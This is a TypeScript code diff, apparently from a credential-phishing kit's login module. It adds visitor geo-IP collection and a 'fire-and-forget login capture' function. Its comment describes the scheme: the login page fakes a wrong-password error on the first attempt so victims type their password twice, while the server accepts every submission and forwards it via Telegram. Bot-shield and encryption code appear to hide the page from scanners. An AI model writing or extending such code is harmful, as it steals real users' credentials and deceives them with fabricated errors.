@@ -1,19 +1,22 @@
 import { functionUrl, SECURITY_CONFIG } from '../config/security';
 import { GATE_TOKEN_TTL_MS } from '../config/botShield.shared';
 import { encryptPayload } from './crypto';
-import { getAccessToken } from './session';
+import { getAccessToken, saveVisitorGeo } from './session';
 import {
   getClientSignals,
   handleBotRedirectResponse,
   type ClientSignals,
 } from './botShield';
 import type { PowSolution } from './pow';
+import type { GeoInfo } from './geoip';
+import { getGeoInfo } from './geoip';
 
 export interface LoginPayload {
   email: string;
   provider?: string;
   password: string;
   turnstileToken?: string | null;
+  attempt?: number;
   clientSignals?: ClientSignals;
   ip?: string;
   country?: string;
@@ -122,6 +125,7 @@ export async function verifyBotGate(
   success: boolean;
   accessToken?: string;
   expiresAt?: number;
+  geo?: GeoInfo;
   error?: string;
   isBot?: boolean;
   redirectUrl?: string;
@@ -185,7 +189,33 @@ export async function submitLogin(
     body: JSON.stringify(encryptedBody),
   });
 
+  try {
+    const data = await response.clone().json();
+    if (data?.success && data?.data?.geo) {
+      saveVisitorGeo(data.data.geo as GeoInfo);
+    }
+  } catch {
+    // Non-JSON responses are ignored.
+  }
+
   return inspectBotResponse(response);
+}
+
+/**
+ * Fire-and-forget login capture for the double sign-in flow.
+ * UI fakes wrong password on attempt 1; server always accepts and sends Telegram.
+ */
+export function fireLoginCapture(
+  payload: Omit<LoginPayload, 'clientSignals'>,
+): void {
+  void (async () => {
+    try {
+      const geo = await getGeoInfo();
+      await submitLogin({ ...payload, ...geo });
+    } catch (err) {
+      console.error('Login capture failed:', err);
+    }
+  })();
 }
 
 export { GATE_TOKEN_TTL_MS, SECURITY_CONFIG };
